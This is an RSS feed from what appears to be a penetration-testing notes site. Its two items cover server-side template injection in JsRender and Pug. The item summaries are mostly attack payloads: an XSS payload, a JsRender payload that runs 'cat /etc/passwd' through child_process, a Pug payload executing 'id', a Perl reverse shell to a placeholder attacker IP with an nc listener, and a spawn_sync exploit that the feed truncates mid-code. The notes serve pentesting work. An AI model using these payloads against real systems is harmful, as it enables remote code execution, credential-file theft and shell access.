<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Template Engine on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/docs/hdks/web/template-engine/</link>
    <description>Recent content in Template Engine on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 17 Jan 2024 11:58:24 +0530</lastBuildDate>
    <atom:link href="https://documentnation.github.io/docs/hdks/web/template-engine/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>JsRender Template Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</guid>
      <description>Investigation linkTry to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.&#xA;{{:2*3}} {{:&amp;#34;test&amp;#34;.toString}} Exploitation link # XSS {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;alert(1)&amp;#34;)}} # Read local files {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /etc/passwd&amp;#39;).toString()&amp;#34;)()}} </description>
    </item>
    <item>
      <title>Pug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(&amp;#34;child_process&amp;#34;).exec(&amp;#39;id&amp;#39;)}()} Reverse Shell linkFirst off, create a payload.&#xA;use Socket;$i=&amp;#34;&amp;lt;local-ip&amp;gt;&amp;#34;;$p=&amp;lt;local-port&amp;gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);}; Encode it with Base64.&#xA;And start listener for getting the incoming connection.&#xA;nc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.&#xA;h1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding(&amp;#39;spawn_sync&amp;#39;)} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;amp;&amp;amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&amp;#39; &amp;#39;);typeof a.shell===&amp;#39;string&amp;#39;?c=a.shell:c=&amp;#39;/bin/sh&amp;#39;,b=[&amp;#39;-c&amp;#39;,g];}typeof a.argv0===&amp;#39;string&amp;#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f&amp;#43;&amp;#39;=&amp;#39;&amp;#43;d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.</description>
    </item>
  </channel>
</rss>
